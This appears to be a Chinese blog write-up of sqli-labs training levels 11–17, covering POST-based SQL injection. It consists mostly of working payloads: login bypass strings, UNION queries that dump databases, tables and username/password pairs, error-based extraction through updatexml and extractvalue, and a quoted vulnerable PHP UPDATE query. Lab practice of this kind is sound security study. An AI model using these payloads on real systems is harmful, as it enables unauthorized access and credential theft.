# sqli-labs靶场(2)POST


sqli-labs靶场精简记录11-17

<!--more-->

### Less-11 POST - Error Based - Single quotes- String

基于错误的POST型单引号字符型注入

万能密码

```
uname=1' or 1=1# & passwd=1
```

bypass

```
uname=-1' union select 1,database() # & passwd=1

uname=-1' union select 1,group_concat(schema_name) from information_schema.schemata # & passwd=1

uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# & passwd=1

uname=-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'# & passwd=1

uname=-1' union select 1,group_concat(username,"|||",password) from users# & passwd=1
```

### Less-12 POST - Error Based - Double quotes- String-with twist

基于错误的双引号POST型字符型变形的注入

bypass

```
uname=admin" & passwd=admin
```

### Less-13 POST - Double Injection - Single quotes- String -twist

POST单引号变形双注入

bypass

```
uname=admin') & passwd=admin
```

### Less-14 POST - Double Injection - Single quotes- String -twist 

POST单引号变形双注入

bypass

```
uname=admin" & passwd=admin
```

### less-15 POST - Blind- Boolian/time Based - Single quotes 

基于bool型/时间延迟单引号POST型盲注

源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。

bypass

```
uname=admin' & passwd=admin
```

### Less-16 POST - Blind- Boolian/Time Based - Double quotes

基于bool型/时间延迟的双引号POST型盲注

bypass

```
uname=admin") & passwd=admin
```

### Less-17 POST - Update Query- Error Based - String

基于错误的更新查询POST注入

审计后端代码，发现uname被check_input包裹了

```
//making sure uname is not injectable

$uname=check_input($_POST['uname']);  



$passwd=$_POST['passwd'];
...
$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
			print_r(mysql_error());
```

注入点是在 update 语句里面，输出了报错日志

#### 子查询注入

```
//查用户名
uname=Dumb&passwd=1' or (select 1 from (select count(*),concat_ws('-',(select user()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- #

//查数据库
uname=Dumb&passwd=1' or (select 1 from (select count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b) where username='Dumb' -- #
```

#### updatexml()函数

updatexml 最大爆 32 个字符

```
uname=Dumb&passwd=1' and updatexml(1,concat('#',(database())),0) -- #

uname=Dumb&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) -- #

uname=Dumb&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security'),0x7e),1) -- #

uname=Dumb&passwd=1' and updatexml(1,concat('#',(select * from (select concat_ws('#',id,username,password) from users limit 0,1) a)),0) -- #
```

#### extractvalue()函数

```
uname=Dumb&passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))-- #
```


